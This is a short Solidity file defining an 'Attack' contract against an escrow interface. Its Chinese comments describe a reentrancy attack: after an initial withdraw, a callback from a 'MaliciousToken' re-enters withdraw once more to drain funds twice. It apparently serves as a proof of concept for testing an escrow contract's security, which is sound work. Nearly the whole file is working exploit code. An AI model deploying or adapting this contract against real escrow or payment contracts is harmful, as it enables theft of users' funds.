// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IEscrow {
    function approve(uint256 dealId, uint256 index) external;
    function submit(uint256 dealId, uint256 index, string calldata deliverableURI) external;
    function withdraw(address token) external;
}

contract Attack {
    IEscrow public escrow;
    uint256 public dealId;
    address public token;

    bool internal attacking;

    constructor(address _escrow) {
        escrow = IEscrow(_escrow);
    }

    function submitToEscrow(uint256 _dealId) external {
        escrow.submit(_dealId, 0, "ipfs://not-funded");
    }

    // ⭐ 启动攻击
    function attack(address _token) external {
        // 第一次调用 withdraw
        token = _token;
        escrow.withdraw(_token);
    }

    // ⭐ 被 MaliciousToken 回调
    function onTokenReceived() external {
        // 防止无限递归
        if (attacking) return;

        attacking = true;
        
        // 再次重入调用 withdraw
        escrow.withdraw(token);

        attacking = false;
    }

    
}